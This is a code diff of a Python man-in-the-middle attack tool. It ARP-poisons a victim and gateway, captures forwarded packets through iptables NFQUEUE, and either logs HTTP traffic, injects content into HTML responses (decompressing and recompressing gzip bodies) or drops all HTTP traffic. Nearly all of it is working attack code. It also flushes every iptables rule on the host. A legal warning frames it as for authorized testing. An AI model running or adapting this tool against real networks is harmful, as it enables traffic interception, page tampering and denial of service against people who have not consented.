-        if b"HTTP/" in payload and "200" not in payload.decode('utf-8', errors='ignore')[:100]:
-            content_type = None
-            try:
-                headers = payload.split(b'\r\n\r\n')[0].decode('utf-8', errors='ignore')
-                for line in headers.split('\r\n'):
-                    if line.lower().startswith('content-type:'):
-                        content_type = line.split(':', 1)[1].strip()
-                        break
-                logger.info(f"[HTTP-SKIP] Non-HTML response: {content_type}")
-            except:
-                logger.info(f"[HTTP-SKIP] HTTP response but couldn't parse content-type")
-        packet.accept()
-        return
-
-    logger.info(f"[HTTP-HTML] 🎯 Processing HTML response from {src_ip} to {dst_ip}")
-
-    try:
-        header_raw, body = payload.split(b"\r\n\r\n", 1)
-    except ValueError:
-        logger.warning(f"[HTTP-HTML] Failed to split headers and body")
-        packet.accept()
-        return
-
-    headers_text = header_raw.decode(errors='ignore')
-    header_dict = {}
-    for line in headers_text.split("\r\n")[1:]:
-        parts = line.split(":", 1)
-        if len(parts) == 2:
-            header_dict[parts[0].strip().lower()] = parts[1].strip().lower()
-
-    # Log important headers
-    content_type = header_dict.get("content-type", "")
-    content_length = header_dict.get("content-length", "")
-    content_encoding = header_dict.get("content-encoding", "")
-    transfer_encoding = header_dict.get("transfer-encoding", "")
-    
-    logger.info(f"[HTTP-HEADERS] Content-Type: {content_type}")
-    logger.info(f"[HTTP-HEADERS] Content-Length: {content_length}")
-    logger.info(f"[HTTP-HEADERS] Content-Encoding: {content_encoding}")
-    logger.info(f"[HTTP-HEADERS] Transfer-Encoding: {transfer_encoding}")
-
-    is_gzip = header_dict.get("content-encoding") == "gzip"
-    is_chunked = header_dict.get("transfer-encoding") == "chunked"
-
-    logger.info(f"[HTTP-PROCESSING] Gzip: {is_gzip}, Chunked: {is_chunked}, Body size: {len(body)} bytes")
-
-    if is_gzip:
-        logger.info("[HTTP-PROCESSING] Processing gzip-compressed response")
-
-        try:
-            raw_body = body
-            if is_chunked:
-                logger.info("[HTTP-PROCESSING] Decoding chunked encoding first")
-                raw_body = decode_chunked(body)
-
-            # Decompress gzip body
-            logger.info(f"[GZIP] Decompressing {len(raw_body)} bytes")
-            decompressed = gzip.decompress(raw_body)
-            logger.info(f"[GZIP] Decompressed to {len(decompressed)} bytes")
-
-            # Log HTML preview
-            html_preview = decompressed[:200].decode('utf-8', errors='ignore')
-            logger.info(f"[HTML-PREVIEW] {html_preview}...")
-
-            # Inject at top
-            logger.info(f"[INJECTION] Attempting injection...")
-            injected_body = inject_at_top(decompressed, injection_code)
-            
-            if len(injected_body) > len(decompressed):
-                logger.info(f"[INJECTION] ✅ Successfully injected {len(injected_body) - len(decompressed)} bytes")
-            else:
-                logger.warning(f"[INJECTION] ❌ Injection may have failed - no size increase")
-
-            # Recompress gzip body
-            logger.info(f"[GZIP] Recompressing {len(injected_body)} bytes")
-            buf = io.BytesIO()
-            with gzip.GzipFile(fileobj=buf, mode='wb') as f:
-                f.write(injected_body)
-            recompressed = buf.getvalue()
-            logger.info(f"[GZIP] Recompressed to {len(recompressed)} bytes")
-
-            if is_chunked:
-                logger.info("[HTTP-PROCESSING] Re-encoding as chunked")
-                recompressed = encode_chunked(recompressed)
-
-            # Update Content-Length header if exists and not chunked
-            if not is_chunked and "content-length" in header_dict:
-                new_length = str(len(recompressed))
-                headers_text = re.sub(
-                    r"(?i)^(Content-Length:\s*)\d+", 
-                    f"Content-Length: {new_length}", 
-                    headers_text, flags=re.MULTILINE
-                )
-                logger.info(f"[HTTP-HEADERS] Updated Content-Length to {new_length}")
-
-            # Rebuild full payload
-            new_payload = headers_text.encode() + b"\r\n\r\n" + recompressed
-
-            scapy_pkt[Raw].load = new_payload
-
-            del scapy_pkt[IP].len
-            del scapy_pkt[IP].chksum
-            del scapy_pkt[TCP].chksum
-
-            packet.set_payload(bytes(scapy_pkt))
-            logger.info("[INJECTION] ✅ Gzip injection and recompression successful")
-
-        except Exception as e:
-            logger.warning(f"[INJECTION] ⚠️ Gzip injection failed (likely incomplete response): {e}")
-            logger.info(f"[INJECTION] Skipping injection and passing through original packet")
-            # Just pass through the original packet without modification
+        
+        # Only process TCP packets with payload
+        if not scapy_pkt.haslayer(TCP) or not scapy_pkt.haslayer(Raw):
+            stats.non_http_packets += 1
             packet.accept()
             return
-
-    else:
-        logger.info("[HTTP-PROCESSING] Processing non-gzip response")
-        try:
-            # Log original body preview
-            body_preview = body[:200].decode('utf-8', errors='ignore')
-            logger.info(f"[HTML-PREVIEW] {body_preview}...")
+        
+        tcp_layer = scapy_pkt[TCP]
+        payload = scapy_pkt[Raw].load
+        
+        logger.debug(f"[TCP-DEBUG] TCP packet: {src_ip}:{tcp_layer.sport} -> {dst_ip}:{tcp_layer.dport}, payload: {len(payload)} bytes")
+        
+        # Use port-based detection like the original working version (port 80 and 8000)
+        # Only process HTTP responses from port 80 or 8000
+        if not ((tcp_layer.sport == 80 or tcp_layer.sport == 8000) and payload.startswith(b'HTTP/')):
+            stats.non_http_packets += 1
             
-            logger.info(f"[INJECTION] Attempting injection...")
-            modified_body = inject_at_top(body, injection_code)
+            # Log more details about why packets are being skipped
+            if tcp_layer.sport == 80 or tcp_layer.dport == 80 or tcp_layer.sport == 8000 or tcp_layer.dport == 8000:
+                payload_preview = payload[:50].decode('utf-8', errors='ignore')
+                logger.debug(f"[PORT-DEBUG] Port 80/8000 traffic but not HTTP response: {src_ip}:{tcp_layer.sport} -> {dst_ip}:{tcp_layer.dport}")
+                logger.debug(f"[PORT-DEBUG] Payload preview: {payload_preview}")
+                
+                if not payload.startswith(b'HTTP/'):
+                    logger.debug(f"[PORT-DEBUG] Payload doesn't start with HTTP/ - might be request or fragment")
             
-            if len(modified_body) > len(body):
-                logger.info(f"[INJECTION] ✅ Successfully injected {len(modified_body) - len(body)} bytes")
-            else:
-                logger.warning(f"[INJECTION] ❌ Injection may have failed - no size increase")
-            
-            new_content_length = str(len(modified_body))
-
-            if re.search(r"(?i)^Content-Length:\s*\d+", headers_text, re.MULTILINE):
-                headers_text = re.sub(r"(?i)^(Content-Length:\s*)\d+", 
-                                      f"Content-Length: {new_content_length}", headers_text, flags=re.MULTILINE)
-                logger.info(f"[HTTP-HEADERS] Updated Content-Length to {new_content_length}")
-            else:
-                headers_text += f"\r\nContent-Length: {new_content_length}"
-                logger.info(f"[HTTP-HEADERS] Added Content-Length: {new_content_length}")
-
-            new_payload = headers_text.encode() + b"\r\n\r\n" + modified_body
-
-            scapy_pkt[Raw].load = new_payload
-
-            del scapy_pkt[IP].len
-            del scapy_pkt[IP].chksum
-            del scapy_pkt[TCP].chksum
-
-            packet.set_payload(bytes(scapy_pkt))
-
-            logger.info(f"[INJECTION] ✅ Non-gzip injection successful")
-        except Exception as e:
-            logger.error(f"[INJECTION] ❌ Non-gzip injection failed: {e}")
             packet.accept()
             return
+        
+        logger.info(f"[HTTP-RESPONSE-FOUND] 🎯 HTTP response detected from {src_ip}:{tcp_layer.sport} -> {dst_ip}:{tcp_layer.dport}")
+        logger.info(f"[HTTP-RESPONSE-FOUND] Payload size: {len(payload)} bytes")
+        
+        # Log HTTP requests for monitoring
+        is_http_request = payload.startswith(b"GET ") or payload.startswith(b"POST ") or \
+                         payload.startswith(b"PUT ") or payload.startswith(b"DELETE ") or \
+                         payload.startswith(b"HEAD ") or payload.startswith(b"OPTIONS ")
+        
+        if is_http_request:
+            monitor_http_packet(scapy_pkt, tcp_layer, payload)
+            packet.accept()
+            return
+        
+        # Now we have HTTP response traffic - handle based on mode
+        
+        logger.info(f"[MODE-HANDLER] Processing HTTP response in {HTTP_ATTACK_MODE} mode")
+        
+        if HTTP_ATTACK_MODE == "MONITOR":
+            # Monitor mode: log the packet and pass it through
+            monitor_http_packet(scapy_pkt, tcp_layer, payload)
+            packet.accept()
+            
+        elif HTTP_ATTACK_MODE == "TAMPER":
+            # Tamper mode: try to inject content into HTML responses
+            logger.info(f"[TAMPER-MODE] Calling tamper_http_packet function")
+            new_payload = tamper_http_packet(scapy_pkt, tcp_layer, payload)
+            if new_payload:
+                # Successful tampering
+                logger.info(f"[TAMPER-MODE] Tampering successful, updating packet")
+                scapy_pkt[Raw].load = new_payload
+                
+                # Clear checksums for recalculation
+                del scapy_pkt[IP].len
+                del scapy_pkt[IP].chksum
+                del scapy_pkt[TCP].chksum
+                
+                packet.set_payload(bytes(scapy_pkt))
+                logger.info(f"[TAMPER] ✅ Packet modified and forwarded")
+            else:
+                # Failed tampering or not suitable for tampering
+                logger.info("[TAMPER-MODE] Tampering failed or not suitable, forwarding original")
+            
+            packet.accept()
+            
+        elif HTTP_ATTACK_MODE == "DROP":
+            # Drop mode: drop all HTTP packets
+            stats.dropped_packets += 1
+            if stats.dropped_packets % 10 == 0:  # Log every 10th drop
+                logger.info(f"[DROP] 🗑️ Dropped HTTP response - Total dropped: {stats.dropped_packets}")
+            
+            # Don't call packet.accept() - this drops the packet
+            packet.drop()
+            
+        else:
+            logger.error(f"[ERROR] Unknown HTTP attack mode: {HTTP_ATTACK_MODE}")
+            packet.accept()
+    
+    except Exception as e:
+        logger.error(f"[ERROR] Error processing packet: {e}")
+        stats.processing_errors += 1
+        packet.accept()
 
-    packet.accept()
-
-
-
-def start_packet_injection():
-    logger.info("[SETUP] Setting up iptables rule for packet interception")
+def start_packet_interception():
+    """Start packet interception based on mode"""
+    logger.info(f"[SETUP] Setting up iptables rules for HTTP {HTTP_ATTACK_MODE} mode")
+    
+    # Clear existing rules first
+    os.system("iptables -F")
+    os.system("iptables -X")
+    
+    # Add our rule
     os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
     
     # Verify iptables rule was added
-    import subprocess
     try:
-        result = subprocess.run(['iptables', '-L', 'FORWARD', '-n'], capture_output=True, text=True)
+        result = subprocess.run(['iptables', '-L', 'FORWARD', '-n'], 
+                              capture_output=True, text=True)
         if 'NFQUEUE' in result.stdout:
             logger.info("[SETUP] ✅ iptables NFQUEUE rule successfully added")
         else:
@@ -519,152 +690,127 @@ def start_packet_injection():
     nfqueue = NetfilterQueue()
     nfqueue.bind(0, modify_packet)
     
-    logger.info("[MITM] 🚀 HTTP injection system started")
-    logger.info("[MITM] 📡 Monitoring for HTTP traffic...")
+    print(f"\n{Fore.GREEN}🚀 HTTP INTERCEPTOR STARTED - {HTTP_ATTACK_MODE} MODE{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}📡 Target: {victim_ip} ↔ Gateway: {gateway_ip}{Style.RESET_ALL}")
     
-    logger.info(f"[MITM] 🎯 Single victim mode: {victim_ip} -> gateway: {gateway_ip}")
+    if HTTP_ATTACK_MODE == "MONITOR":
+        print(f"{Fore.YELLOW}👁️  MONITOR MODE: Logging all HTTP traffic without modification{Style.RESET_ALL}")
+        print(f"{Fore.BLUE}💡 Watch the output for detailed HTTP request/response information{Style.RESET_ALL}")
+    elif HTTP_ATTACK_MODE == "TAMPER":
+        print(f"{Fore.RED}🔧 TAMPER MODE: Injecting content into HTML responses{Style.RESET_ALL}")
+        print(f"{Fore.BLUE}💉 Injection Type: {AttackConfig.CURRENT_HTML_INJECTION}{Style.RESET_ALL}")
+        print(f"{Fore.BLUE}📏 Injection Size: {len(html_injection_block)} bytes{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}💡 Browse to HTTP sites like http://neverssl.com to see injection{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}✨ Original page content will be preserved with injected banner{Style.RESET_ALL}")
+    elif HTTP_ATTACK_MODE == "DROP":
+        print(f"{Fore.MAGENTA}🗑️  DROP MODE: Blocking all HTTP traffic{Style.RESET_ALL}")
+        print(f"{Fore.RED}⚠️  Victim will be unable to browse HTTP sites{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}💡 HTTPS sites will still work (encrypted){Style.RESET_ALL}")
     
-    logger.info("[MITM] 💉 Injection payload: {} ({} bytes)".format(
-        AttackConfig.CURRENT_PAYLOAD, 
-        len(injection_code)
-    ))
-    logger.info("[MITM] 🛑 Press Ctrl+C to stop and cleanup")
+    print(f"{Fore.WHITE}🛑 Press Ctrl+C to stop and view statistics{Style.RESET_ALL}")
     
     try:
         nfqueue.run()
     except KeyboardInterrupt:
-        logger.info("\n[MITM] 🛑 Stopping HTTP injector...")
+        print(f"\n{Fore.YELLOW}[INTERCEPTOR] 🛑 Stopping HTTP interceptor...{Style.RESET_ALL}")
     finally:
         nfqueue.unbind()
         logger.info("[CLEANUP] Removing iptables rules...")
         os.system("iptables -F")
+        stats.print_stats()
 
-def display_attack_configuration():
-    """Display current attack configuration and get user confirmation"""
-    print("\n" + "="*70)
-    print("🎯 ARP CACHE POISONING & MITM ATTACK CONFIGURATION")
-    print("="*70)
+def print_mode_explanation():
+    """Print explanation of the 3 modes"""
+    print(f"\n{Fore.CYAN}{'='*70}")
+    print(f"🎯 HTTP INTERCEPTOR - 3 MODES EXPLAINED")
+    print(f"{'='*70}{Style.RESET_ALL}")
     
-    print(f"\n📡 NETWORK INTERFACE:")
-    print(f"   Interface: {interface}")
+    print(f"\n{Fore.YELLOW}📋 CURRENT MODE: {HTTP_ATTACK_MODE}{Style.RESET_ALL}")
     
-    print(f"\n🎯 ATTACK TARGETS:")
-    print(f"   Victim Device:")
-    print(f"     IP:  {victim_ip}")
-    print(f"     MAC: {victim_mac}")
+    print(f"\n{Fore.GREEN}1. MONITOR MODE:{Style.RESET_ALL}")
+    print(f"   • Logs all HTTP traffic without modification")
+    print(f"   • Shows detailed request/response information")
+    print(f"   • Perfect for understanding network behavior")
+    print(f"   • No impact on victim browsing experience")
     
-    print(f"\n   Gateway/Router:")
-    print(f"     IP:  {gateway_ip}")
-    print(f"     MAC: {gateway_mac}")
+    print(f"\n{Fore.RED}2. TAMPER MODE:{Style.RESET_ALL}")
+    print(f"   • Injects malicious content into HTML responses")
+    print(f"   • Handles gzip compression/decompression")
+    print(f"   • Modifies web pages in real-time")
+    print(f"   • Demonstrates content injection attacks")
     
-    # Get current injection payload info
-    current_payload = AttackConfig.INJECTION_PAYLOADS.get(AttackConfig.CURRENT_PAYLOAD, AttackConfig.INJECTION_CODE)
-    payload_preview = current_payload.decode('utf-8', errors='ignore')[:100] if isinstance(current_payload, bytes) else str(current_payload)[:100]
+    print(f"\n{Fore.MAGENTA}3. DROP MODE:{Style.RESET_ALL}")
+    print(f"   • Drops all HTTP packets completely")
+    print(f"   • Prevents victim from browsing HTTP sites")
+    print(f"   • Demonstrates denial-of-service attacks")
+    print(f"   • HTTPS traffic remains unaffected")
     
-    print(f"\n💉 HTTP INJECTION:")
-    print(f"   Payload Type: {AttackConfig.CURRENT_PAYLOAD}")
-    print(f"   Injection Enabled: {AttackConfig.ENABLE_HTTP_INJECTION}")
-    print(f"   Payload Preview: {payload_preview}{'...' if len(payload_preview) >= 100 else ''}")
+    print(f"\n{Fore.BLUE}🔧 TO CHANGE MODE:{Style.RESET_ALL}")
+    print(f"   Edit config.py and change:")
+    print(f"   AttackConfig.HTTP_ATTACK_MODE = 'MONITOR'  # or 'TAMPER' or 'DROP'")
     
-    print(f"\n⚙️  ATTACK SETTINGS:")
-    print(f"   ARP Poison Interval: {AttackConfig.ARP_POISON_INTERVAL} seconds")
-    print(f"   Packet Logging: {AttackConfig.ENABLE_PACKET_LOGGING}")
-    print(f"   Gzip Handling: {AttackConfig.ENABLE_GZIP_HANDLING}")
+    print(f"\n{Fore.YELLOW}🧪 TESTING RECOMMENDATIONS:{Style.RESET_ALL}")
+    print(f"   • Start with MONITOR mode to understand traffic")
+    print(f"   • Use TAMPER mode to test content injection")
+    print(f"   • Use DROP mode to test DoS protection")
+    print(f"   • Test with: http://neverssl.com (HTTP-only site)")
     
-    print(f"\n🛡️  SECURITY SETTINGS:")
-    print(f"   Auto Cleanup: {SecurityConfig.AUTO_CLEANUP}")
-    print(f"   Max Duration: {SecurityConfig.MAX_ATTACK_DURATION} seconds")
-    print(f"   Legal Warning: {SecurityConfig.SHOW_LEGAL_WARNING}")
-    
-    print(f"\n📊 NETWORK STATUS:")
-    # Check if targets are reachable
-    import subprocess
-    
-    # Check victim
-    print(f"   Victim ({victim_ip}):")
-    try:
-        victim_ping = subprocess.run(['ping', '-c', '1', '-W', '1', victim_ip], 
-                                       capture_output=True, timeout=3)
-        victim_status = "🟢 Reachable" if victim_ping.returncode == 0 else "🔴 Unreachable"
-    except:
-        victim_status = "❓ Unknown"
-    print(f"     Status: {victim_status}")
-        
-        # Check if victim is in ARP table
-    try:
-        arp_result = subprocess.run(['arp', '-n'], capture_output=True, text=True)
-        victim_in_arp = victim_ip in arp_result.stdout
-        print(f"     In ARP table: {'✅' if victim_in_arp else '❌'}")
-    except:
-        print(f"     ARP table: ❓ Unable to check")
-    
-    # Check gateway
-    print(f"\n   Gateway ({gateway_ip}):")
-    try:
-        gateway_ping = subprocess.run(['ping', '-c', '1', '-W', '1', gateway_ip], 
-                                    capture_output=True, timeout=3)
-        gateway_status = "🟢 Reachable" if gateway_ping.returncode == 0 else "🔴 Unreachable"
-    except:
-        gateway_status = "❓ Unknown"
-    
-    print(f"     Status: {gateway_status}")
-    
-    try:
-        arp_result = subprocess.run(['arp', '-n'], capture_output=True, text=True)
-        gateway_in_arp = gateway_ip in arp_result.stdout
-        print(f"     In ARP table: {'✅' if gateway_in_arp else '❌'}")
-    except:
-        print(f"     ARP table: ❓ Unable to check")
-    
-    print("="*70)
-    
-    if SecurityConfig.SHOW_LEGAL_WARNING:
-        print("\n⚠️  LEGAL WARNING:")
-        print("   This tool is for EDUCATIONAL and AUTHORIZED TESTING ONLY!")
-        print("   Ensure you have explicit permission to test this network.")
-        print("   Unauthorized network attacks are illegal and may result in criminal charges.")
-    
-    print("\n🚀 ATTACK FLOW:")
-    print("   1. Enable IP forwarding on this machine")
-    print("   2. Start continuous ARP poisoning (bidirectional)")
-    print("   3. Set up iptables rules for packet interception")
-    print("   4. Launch HTTP content injection")
-    print("   5. Monitor and log all activities")
-    print("   6. Clean up and restore on exit (Ctrl+C)")
-    
-    if SecurityConfig.REQUIRE_CONFIRMATION:
-        print("\n" + "="*70)
-        confirmation = input("🔍 Do you want to proceed with this attack? [y/N]: ").lower().strip()
-        if confirmation not in ['y', 'yes']:
-            print("❌ Attack cancelled by user.")
-            sys.exit(0)
-        
-        print("✅ Attack confirmed. Starting in 3 seconds...")
-        time.sleep(3)
-    
-    print("="*70)
+    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
 
 def main():
-    # Display attack configuration and get confirmation
-    display_attack_configuration()
+    """Main function"""
+    print_mode_explanation()
     
-    logger.info("[ATTACK] 🚀 Starting ARP poisoning & MITM attack")
+    # Validate mode
+    if HTTP_ATTACK_MODE not in AttackConfig.ALLOWED_HTTP_ATTACK_MODES:
+        print(f"{Fore.RED}❌ Invalid HTTP attack mode: {HTTP_ATTACK_MODE}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}💡 Valid modes: {AttackConfig.ALLOWED_HTTP_ATTACK_MODES}{Style.RESET_ALL}")
+        sys.exit(1)
+    
+    # Ask for confirmation
+    if SecurityConfig.REQUIRE_CONFIRMATION:
+        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
+        confirmation = input(f"🔍 Proceed with HTTP {HTTP_ATTACK_MODE} mode? [y/N]: ").lower().strip()
+        if confirmation not in ['y', 'yes']:
+            print(f"{Fore.YELLOW}❌ Attack cancelled by user.{Style.RESET_ALL}")
+            sys.exit(0)
+        
+        if HTTP_ATTACK_MODE == "DROP":
+            print(f"{Fore.RED}⚠️  WARNING: DROP mode will prevent HTTP browsing!{Style.RESET_ALL}")
+            confirmation = input("🔍 Are you sure you want to block HTTP traffic? [y/N]: ").lower().strip()
+            if confirmation not in ['y', 'yes']:
+                print(f"{Fore.YELLOW}❌ DROP mode cancelled.{Style.RESET_ALL}")
+                sys.exit(0)
+    
+    logger.info(f"[ATTACK] 🚀 Starting HTTP {HTTP_ATTACK_MODE} attack")
+    logger.info(f"[ATTACK] Target: {victim_ip} ↔ Gateway: {gateway_ip}")
     logger.info(f"[ATTACK] Attacker MAC: {get_if_hwaddr(interface)}")
     
-    enable_ip_forwarding()
+    # Enable IP forwarding (except for DROP mode where we want to break connectivity)
+    if HTTP_ATTACK_MODE != "DROP":
+        if not enable_ip_forwarding():
+            logger.error("❌ Failed to enable IP forwarding")
+            sys.exit(1)
+    else:
+        logger.info("[DROP-MODE] Skipping IP forwarding to enhance blocking effect")
 
     def exit_gracefully(signum, frame):
-        logger.info("\n[CLEANUP] 🧹 Starting cleanup process...")
+        logger.info(f"\n[CLEANUP] 🧹 Starting cleanup process...")
         logger.info("[CLEANUP] Restoring ARP tables...")
         
-        # Restore ARP tables for all victims
+        # Restore ARP tables
         restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
         restore(gateway_ip, gateway_mac, victim_ip, victim_mac)
         
-        disable_ip_forwarding()
+        if HTTP_ATTACK_MODE != "DROP":
+            disable_ip_forwarding()
+        
         logger.info("[CLEANUP] Removing iptables rules...")
         os.system("iptables -F")
         logger.info("[CLEANUP] ✅ Cleanup complete")
+        
+        # Print final statistics
+        stats.print_stats()
         sys.exit(0)
 
     signal.signal(signal.SIGINT, exit_gracefully)
@@ -674,32 +820,27 @@ def main():
         logger.info("[ARP-POISON] 🎯 Starting continuous ARP poisoning")
         logger.info(f"[ARP-POISON] Interval: {AttackConfig.ARP_POISON_INTERVAL} seconds")
         
-        logger.info(f"[ARP-POISON] Single victim mode: {victim_ip} <-> {gateway_ip}")
-        
         poison_count = 0
         while True:
-            # Poison victim: tell victim that gateway is at attacker's MAC
+            # Bidirectional poisoning
             poison(victim_ip, victim_mac, gateway_ip)
-                
-            # Poison gateway: tell gateway that this victim is at attacker's MAC
             poison(gateway_ip, gateway_mac, victim_ip)
             
-            poison_count += 2  # 2 packets per victim (bidirectional)
-            if poison_count % 10 == 0:  # Log every 10 rounds
-                logger.info(f"[ARP-POISON] Sent {poison_count} poison packets")
+            poison_count += 2
+            if poison_count % 20 == 0:  # Log every 20 rounds (40 packets)
+                logger.debug(f"[ARP-POISON] Sent {poison_count} poison packets")
             
             time.sleep(AttackConfig.ARP_POISON_INTERVAL)
 
-    from threading import Thread
-    poison_thread = Thread(target=poison_loop, daemon=True)
+    poison_thread = threading.Thread(target=poison_loop, daemon=True)
     poison_thread.start()
     
     # Give ARP poisoning time to take effect
     logger.info("[ATTACK] Waiting 3 seconds for ARP poisoning to take effect...")
     time.sleep(3)
 
-    # Start HTTP injection
-    start_packet_injection()
+    # Start HTTP interception
+    start_packet_interception()
 
 if __name__ == "__main__":
-    main()
+    main() 
